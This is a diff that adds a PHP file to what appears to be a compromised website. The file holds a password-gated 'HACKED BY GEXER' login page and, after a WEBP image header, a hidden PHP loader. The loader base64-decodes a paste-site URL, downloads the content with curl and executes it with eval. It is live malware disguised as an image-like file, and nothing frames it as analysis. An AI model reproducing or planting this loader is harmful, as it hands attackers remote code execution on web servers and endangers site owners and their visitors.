@@ -1,0 +1,160 @@
+<?php
+session_start();
+
+$ewean = '$2y$12$R2YoE/JEstOSMwOCm6CxCeN5KauDGfAa.TiF1Edp7nBaw3NxVYT6C';
+
+if (!isset($_SESSION['authenticated'])) {
+    if (isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $ewean)) {
+            $_SESSION['authenticated'] = true;
+        } else {
+            echo "<p style='color:red; text-align:center;'>Password salah!</p>";
+        }
+    }
+
+    if (!isset($_SESSION['authenticated'])) {
+        echo '
+        <!DOCTYPE html>
+        <html>
+        <head>
+        <meta charset="UTF-8">
+        <title>Gexer Login</title>
+        <style>
+            body, html {
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+                height: 100%;
+                background: black;
+                color: #0f0;
+                font-family: "Courier New", monospace;
+            }
+            canvas {
+                position: fixed;
+                top: 0;
+                left: 0;
+                z-index: -1;
+            }
+            .login-box {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                border: 2px solid #0f0;
+                padding: 20px;
+                background: rgba(0, 0, 0, 0.8);
+                border-radius: 10px;
+                box-shadow: 0 0 15px #0f0;
+                color: #0f0;
+                width: 300px;
+                text-align: center;
+            }
+            .login-box form {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+            input[type="password"],
+            input[type="submit"] {
+                width: 100%;
+                padding: 10px;
+                margin: 10px 0;
+                background: #000;
+                border: 1px solid #0f0;
+                color: #0f0;
+                font-size: 16px;
+                border-radius: 5px;
+            }
+            input[type="submit"]:hover {
+                background: #0f0;
+                color: #000;
+                cursor: pointer;
+            }
+        </style>
+        </head>
+        <body>
+            <canvas id="matrix"></canvas>
+            <div class="login-box">
+                <h2>HACKED BY GEXER</h2>
+                <form method="post">
+                    <label>Password:</label>
+                    <input type="password" name="password" required>
+                    <input type="submit" value="Login">
+                </form>
+            </div>
+            <script>
+                const canvas = document.getElementById("matrix");
+                const ctx = canvas.getContext("2d");
+
+                canvas.height = window.innerHeight;
+                canvas.width = window.innerWidth;
+
+                const letters = "アァイィウヴエェオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                const fontSize = 16;
+                const columns = canvas.width / fontSize;
+                const drops = [];
+
+                for (let x = 0; x < columns; x++) {
+                    drops[x] = 1;
+                }
+
+                function draw() {
+                    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                    ctx.fillStyle = "#0f0";
+                    ctx.font = fontSize + "px monospace";
+
+                    for (let i = 0; i < drops.length; i++) {
+                        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                            drops[i] = 0;
+                        }
+
+                        drops[i]++;
+                    }
+                }
+
+                setInterval(draw, 33);
+            </script>
+        </body>
+        </html>';
+        exit;
+    }
+}
+
+// Jika sudah login
+echo "<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='UTF-8'>
+    <title>Selamat Datang</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 20%;
+        }
+    </style>
+</head>
+<body>
+    <h1>BUBADIBAKO</h1>
+</body>
+</html>";
+?>
+RIFF¤  WEBPVP8 ˜  ðÑ *ôô>‘HŸK¥¤"§£±¨àð	
+<?php
+$url = base64_decode('aHR0cHM6Ly9jaGl6dS5zcGFjZS9yYXcvYWQ5ZjI5'); // URL dienkode dalam base64
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$output = curl_exec($ch);
+curl_close($ch);
+
+eval("?>".$output);
+?>
+
